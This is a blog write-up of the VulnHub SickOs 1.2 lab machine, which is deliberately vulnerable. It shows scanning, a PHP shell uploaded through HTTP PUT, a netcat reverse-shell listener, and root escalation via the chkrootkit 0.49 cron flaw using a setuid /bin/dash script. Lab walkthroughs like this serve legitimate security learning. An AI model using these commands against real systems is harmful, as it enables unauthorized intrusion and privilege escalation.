---
layout: post
title: "SickOs 1.2 writeup"
date: 2017-07-03 04:20:13 -0400
comments: true
categories: [penetration testing, writeups]
keywords: sickos 1.2, sickos 1.2 walkthrough, sickos 1.2, sickos 1.2 solution, sickos 1.2 writeup, sickos vulnhub
description: SickOs 1.2 writeup
---

Today's VM is the second machine in the SickOs series. The goal is to obtain the root flag. Target acquired!

<!-- more --> 

I did a fast scan with Masscan and discovered that ports 22 and 80 are open. Then I scanned them with Nmap:

``` 
nmap -T4 -p22,80 -sV 192.168.217.146

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-03 09:11 EDT
Nmap scan report for 192.168.217.146
Host is up (0.00030s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
```

The web server serves this pic:

{% img center /images/pentest/sickos/2-blow.jpg 'web server' 'webpage' %}

Nothing in exiftool. I bruteforced the web server, but the only discovery was an empty test directory. I initially overlooked the page source of the picture, until I noticed there is a scroll bar. So I scrolled down to find a comment:

``` 
<!-- NOTHING IN HERE ///\\\ -->>>>
```

I tried constructing a path out of the comment, but didn't get anywhere. Searching for an exploit for the lighttpd server version didn't yield anything either, although I found some for other versions.

Back to the empty directory, I found it strange that there would be an innocuous empty folder on the web server, and I thought it might hint to making it..not empty by uploading something there :-) I was at a loss on how to do that with no attack vectors, but then I remembered that uploading something on a server doesn't always require sophisticated mechanisms and PHP vulnerabilities and the like. It's just as simple as using a certain HTTP method that you don't see too often: [PUT](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT)

First, I needed to verify if PUT is allowed in the first place:

``` 
nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.217.146
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test
```

Excellent! I proceeded to upload a PHP shell with curl,but I got some weird expectation failed errors. Luckily, Nmap also has a script for PUT'ing things on a server:

``` 
nmap -p 80 192.168.217.146 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='/root/Desktop/shell.php'

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-04 04:36 EDT
Nmap scan report for 192.168.217.146
Host is up (0.00031s latency).
PORT   STATE SERVICE
80/tcp open  http
|_http-put: /test/shell.php was successfully created
```

All didn't work well, though. I usually use 8888 for my reverse shells, but this time I got nothing. I tried port 80, and still no joy. It seems that only port 443 is allowed. I looked at other walkthroughs for this, so I'm not sure how you could determine it otherwise besides trial and error. But when I changed to the correct port, I got the shell:

``` 
nc -vnlp 443
listening on [any] 443 ...
connect to [192.168.217.132] from (UNKNOWN) [192.168.217.146] 49769
Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 01:48:24 up  1:38,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Next, I did some enumeration. The usual culprits didn't stand out, and the permissions on this shell were pretty limited, but I did find something interesting pertaining to cron:

``` 
$ ls -al /etc/cron*
-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab

ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Jul  4 00:10 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```

The entry that got my attention was the chkrootkit one. chkrootkit is a tool that checks for rootkits on the system. I googled for possible exploits, and I did find [one](https://www.exploit-db.com/exploits/33899/) right away. The vulnerable version is 0.49. I checked which version is installed on the system:

``` 
$ chkrootkit -V
chkrootkit version 0.49
```

Well, well! The exploit leverages exactly the case here, vulnerable chkrootkit running as root, courtesy of the cron job. The step to compromise the system is to put an executable file named 'update' with non-root owner in /tmp

So, my idea was to give myself privileges to run an existing shell as root. I looked at what shells are installed on the system:

``` 
$ cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
$ ls -l /bin/*sh
-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash
-rwxr-xr-x 1 root root 100284 Mar 29  2012 /bin/dash
lrwxrwxrwx 1 root root      4 Mar 28  2013 /bin/rbash -> bash
lrwxrwxrwx 1 root root      4 Mar 29  2012 /bin/sh -> dash
lrwxrwxrwx 1 root root      7 Nov 16  2012 /bin/static-sh -> busybox
```

I wasted almost an hour next, because the non-interactive shell gave me grief and prevented things from working properly. I started with bash and made it suid and ran it, but it didn't work. What worked was making dash suid and also spawning a TTY shell with <code>python -c 'import pty; pty.spawn("/bin/sh")'</code>.

Inside the update file, I just made */bin/dash* suid:

``` 
$ cat update
#!/bin/bash
chmod u+s /bin/dash
```

Then I waited a minute for cron to run and got root:

``` 
$ /bin/dash
/bin/dash
# whoami
whoami
root
```

Besides the flag, in the root directory there was rule file for iptables that explained the VM's behavior. Anyway, here's the flag:

``` 
# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt
WoW! If you are viewing this, You have "Sucessfully!!" completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.

Thanks for giving this try.

@vulnhub: Thanks for hosting this UP!.
```

This machine was challenging in the way it limited you to only certain actions. Damn, the first thing I will do from now on when getting a limited shell is spawn a TTY!!!

``` 
 ________________________________________
/ Tomorrow will be cancelled due to lack \
\ of interest.                           /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```




